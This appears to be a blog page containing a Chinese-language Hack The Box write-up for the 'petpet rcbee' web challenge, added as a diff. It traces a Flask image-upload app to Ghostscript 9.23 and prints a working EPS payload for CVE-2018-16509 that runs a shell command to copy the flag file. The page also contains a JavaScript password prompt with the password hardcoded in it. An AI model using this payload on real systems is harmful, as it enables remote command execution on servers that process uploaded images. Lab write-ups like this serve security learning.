@@ -1,0 +1,240 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>[HTB] petpet rcbee  | 持剑</title>
+<meta name="description" content="碎月星辰揽江风 , 我心有剑问天涯 ">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://1dayluo.github.io">
+        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://1dayluo.github.io">
+        <h1 class="site-title">持剑</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">[HTB] petpet rcbee </h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2021-12-28</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://1dayluo.github.io/tag/iAzsp2lm0F/">
+                    HTB
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/hkZZrvn-OU4/">
+                    web
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <h1 id="petpet-rcbee">petpet rcbee</h1>
+<p><s>又是一道flask+python的题(后来发现无关)</s></p>
+<figure data-type="image" tabindex="1"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/petpetrobee_1.png" alt="Untitled" loading="lazy"></figure>
+<!-- more -->
+<script language = JavaScript> function password() {
+
+    var testV = 1;
+
+    var pass1 = prompt('please input the password','');
+
+    var passwordforthisarticle = "dhlove";
+
+    var inputtimemax = 5;
+
+    while (testV < inputtimemax) {
+
+    if (!pass1)
+
+    history.go(-1);
+
+    if (pass1 == passwordforthisarticle) {
+
+    break;
+
+    }
+
+    testV+=1;
+
+    var pass1 =
+
+    prompt('Password error!');
+
+    }
+
+    if (pass1!= passwordforthisarticle & testV == inputtimemax)  
+
+    history.go(-1);
+
+    return " ";
+
+    }
+
+    document.write(password());
+
+</script>
+<h2 id="分析">分析</h2>
+<h3 id="flask">Flask</h3>
+<p><strong>文件上传功能</strong>(/api/upload)</p>
+<p>上传前会先进行一次对文件名的判断:在函数<code>allowed_file</code> 中实现:</p>
+<pre><code class="language-php">def allowed_file(filename):
+    return '.' in filename and \
+        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+</code></pre>
+<p>就是检查文件后缀是否满足,同时文件后缀名在ALLOWED_EXTENSIONS里(png,jpg,jpeg)</p>
+<p>如果文件名符合:</p>
+<p>文件上传会上传为临时文件(会自动删除),且文件名有再次的安全审查,调用了<code>werkzeug.utils</code> 下的<code>secure_filename</code> 方法</p>
+<pre><code class="language-php">tmp  = tempfile.gettempdir()
+path = os.path.join(tmp, secure_filename(file.filename))
+</code></pre>
+<p><strong>而该应用主要使用的是PIL模块,从而实现”摸摸头”的效果</strong></p>
+<h3 id="dockerfile">Dockerfile</h3>
+<p>发现docker下载了ghostscript-9.23</p>
+<h2 id="漏洞">漏洞</h2>
+<p>一搜索ghostscript-9.23 exploid的就搜到了,现在要学习的就是利用姿势</p>
+<p>Python PIL/Pillow Remote Shell Command Execution via Ghostscript CVE-2018-16509</p>
+<p>链接见:<a href="https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509">https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509</a></p>
+<p>可以看到PIL使用了Ghostscript作为引擎</p>
+<p>构造合适的payload</p>
+<pre><code class="language-php">%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: -0 -0 100 100
+
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe% cat /app/flag &gt;&gt; /app/application/static/assets/flag) currentdevice putdeviceprops
+</code></pre>
+<p>查看对应路径就可以下载到flag文件了</p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://1dayluo.github.io/post/htb-weather-App/">
+              <h3 class="post-title">
+                下一篇： [HTB] 又一道writeup:Weather | 收获颇多
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">碎月星辰揽江风 , 我心有剑问天涯 </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
